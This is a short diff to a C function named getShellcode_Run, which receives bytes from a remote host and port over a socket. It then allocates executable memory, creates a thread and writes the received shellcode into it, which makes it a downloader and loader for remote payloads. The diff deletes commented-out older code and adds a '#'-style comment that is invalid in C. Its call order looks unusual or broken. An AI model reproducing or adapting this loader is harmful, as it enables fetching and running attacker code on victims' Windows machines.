@@ -147,8 +147,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
 		else
 			printf("recv failed with error: %d\n", WSAGetLastError());
 
-
-
+		# Execute the loaded shellcode
 		HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
 		PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof recvbuf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 		VirtualProtectEx(processHandle, remoteBuffer, sizeof recvbuf, 0x01, NULL);
@@ -158,16 +157,6 @@ void getShellcode_Run(char* host, char* port, char* resource) {
 		ResumeThread(remoteThread);
 		WriteProcessMemory(processHandle, remoteBuffer, recvbuf, sizeof recvbuf, NULL);
 		CloseHandle(processHandle);
-
-
-		//HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
-		//PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof recvbuf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-		//WriteProcessMemory(processHandle, remoteBuffer, recvbuf, sizeof recvbuf, NULL);
-		//HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
-		//CloseHandle(processHandle);
-
-
-
 
 	} while (iResult > 0);
 	////////////////////
